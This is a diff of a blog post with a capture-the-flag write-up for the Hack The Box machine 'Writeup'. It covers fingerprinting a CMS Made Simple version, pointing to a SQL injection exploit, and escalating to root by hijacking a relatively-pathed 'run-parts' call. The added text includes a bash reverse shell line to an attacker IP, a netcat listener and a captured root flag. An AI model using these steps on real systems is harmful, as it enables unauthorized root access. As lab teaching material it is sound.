@@ -71,12 +71,40 @@ At first, try to look at the web page.
 ![placeholder](https://inar1.github.io/public/images/2019-10-12/2019-10-10-15-54-20.png)
 
 There was nothing here. Next, look at the path which is specified in "http-robots.txt"<br>
-We can find a web page which "CMS Made Simple" is used.
+We can find a web page which "<a href="https://www.cmsmadesimple.org/">CMS Made Simple</a>" is used.
 ![placeholder](https://inar1.github.io/public/images/2019-10-12/2019-10-10-15-54-58.png)
 ![placeholder](https://inar1.github.io/public/images/2019-10-12/2019-10-10-15-55-20.png)
 
+In the download page of CMS Made Simple, we can find a link which we can see the content of the package.
+![placeholder](https://inar1.github.io/public/images/2019-10-12/2019-10-12-19-12-34.png)
+![placeholder](https://inar1.github.io/public/images/2019-10-12/2019-10-12-19-13-04.png)
+
+In the directory "/trunk/doc", we can find "CHANGELOG.txt".
+![placeholder](https://inar1.github.io/public/images/2019-10-12/2019-10-12-19-30-06.png)
+
+By accessing the "CHANGELOG.txt" on Writeup, we can figure out the version of CMS Made Simple is "2.2.9.1"
+{% highlight shell %}
+root@kali:~# curl http://10.10.10.138/writeup/doc/CHANGELOG.txt 
+Version 2.2.9.1
+-------------------------------
+Core - General
+  - fix to the CmsLayoutStylesheetQuery class
+  - fix an edge case in the Database\Connection::DbTimeStamp() method
+
+MicroTiny v2.2.4
+  - Minor fix in error displays.
+
+Phar Installer v1.3.7
+  - Fix to edge case in step 3 where memory_limit is set to -1
+
+Version 2.2.9 - Blow Me Down
+
+~~~
+
+{% endhighlight %}
+
 Then, look for the exploit.<br>
-We have bunch of them but this time <a href="https://www.exploit-db.com/exploits/46635">CMS Made Simple &gt; 2.2.10 - SQL Injection</a> was used.
+We have bunch of them but we have exploit for close version <a href="https://www.exploit-db.com/exploits/46635">CMS Made Simple &gt; 2.2.10 - SQL Injection</a>.
 {% highlight shell %}
 root@kali:~# searchsploit CMS made simple
 ------------------------------------------------------------------------------------- ----------------------------------------
@@ -157,7 +185,7 @@ d4e493fd4068afc9eb1aa6a55319f978
 
 ### 3. Getting Root
 
-By running pyspy64 and login with another windows, we can find that When someone login, following command runs.
+By running <a href="https://github.com/DominicBreuker/pspy">pyspy</a> and login with another windows, we can find that When someone login, following command runs.
 {% highlight shell %}
 2019/10/02 12:49:04 CMD: UID=0    PID=5837   | sshd: [accepted]
 2019/10/02 12:49:04 CMD: UID=0    PID=5838   | sshd: [accepted]  
@@ -168,42 +196,57 @@ By running pyspy64 and login with another windows, we can find that When someone
 2019/10/02 12:49:09 CMD: UID=0    PID=5843   | sshd: jkr [priv]  
 {% endhighlight %}
 
-In following command, only 'run-parts' is using relative path.
+In following command, only 'run-parts' is using relative path.<br>
+We can take advantage of this.<br>
 {% highlight shell %}
-sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
+2019/10/02 12:49:09 CMD: UID=0    PID=5841   | run-parts --lsbsysinit /etc/update-motd.d 
 {% endhighlight %}
 
-On normal linux, "run-parts" is in the directory "/usr/bin"
+On this server, we have "run-parts" in "/bin".
 {% highlight shell %}
-root@kali:~# ls -l /usr/bin/ | grep run-parts
--rwxr-xr-x 1 root   root          27472 Sep  7 01:29 run-parts
+jkr@writeup:~$ which run-parts
+/bin/run-parts
 {% endhighlight %}
 
-On the other hand, this server doesn't have "run-parts" in "/usr/bin".
+However, we have several directories in the PATH before "/bin" which is writable for users.
 {% highlight shell %}
-jkr@writeup:/usr/bin$ ls -l | grep run-parts
-jkr@writeup:/usr/bin$ 
-{% endhighlight %}
+jkr@writeup:~$ echo $PATH
+/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
 
-By looking at the first path of PATH "/usr/local/sbin", we can notice that we have a write permission even though we don't have read permission.
-{% highlight shell %}
-jkr@writeup:/usr/local$ ls -l
-total 56
+jkr@writeup:~$ ls -l /usr/local/ | grep bin
 drwx-wsr-x 2 root staff 20480 Apr 19 04:11 bin
-drwxrwsr-x 2 root staff  4096 Apr 19 04:11 etc
-drwxrwsr-x 2 root staff  4096 Apr 19 04:11 games
-drwxrwsr-x 2 root staff  4096 Apr 19 04:11 include
-drwxrwsr-x 4 root staff  4096 Apr 24 13:13 lib
-lrwxrwxrwx 1 root staff     9 Apr 19 04:11 man -> share/man
-drwx-wsr-x 2 root staff 12288 Oct 10 14:51 sbin
-drwxrwsr-x 7 root staff  4096 Apr 19 04:30 share
-drwxrwsr-x 2 root staff  4096 Apr 19 04:11 src
+drwx-wsr-x 2 root staff 12288 Apr 19 04:11 sbin
 {% endhighlight %}
-
 
 Then, create a reverse shell executable with the name "run-parts" in "/usr/local/sbin".
 {% highlight shell %}
-jkr@writeup:~$ cd /usr/local/sbin/
+jkr@writeup:~$ echo "#! /bin/bash" > /usr/local/bin/run-parts
 
-jkr@writeup:/usr/local/sbin$ echo "/bin/bash -i >& /dev/tcp/10.10.14.30/443 0>&1" > ./run-parts
+jkr@writeup:~$ echo "bash -i >& /dev/tcp/10.10.14.30/443 0>&1" >> /usr/local/bin/run-parts
+
+jkr@writeup:~$ chmod +x /usr/local/bin/run-parts
+
+jkr@writeup:~$ cat /usr/local/bin/run-parts
+#! /bin/bash
+bash -i >& /dev/tcp/10.10.14.30/443 0>&1
+{% endhighlight %}
+
+After that, launch the netcat listener and login to Writeup with SSH as jkr user.<br>
+We can get a reverse shell as a root user.
+{% highlight shell %}
+root@kali:~# nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.14.30] from (UNKNOWN) [10.10.10.138] 50656
+bash: cannot set terminal process group (2460): Inappropriate ioctl for device
+bash: no job control in this shell
+root@writeup:/# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+{% endhighlight %}
+
+As usual, root.txt is in the directory "/root"
+{% highlight shell %}
+root@writeup:/root# cat root.txt
+cat root.txt
+eeba47f60b48ef92b734f9b6198d7226
 {% endhighlight %}
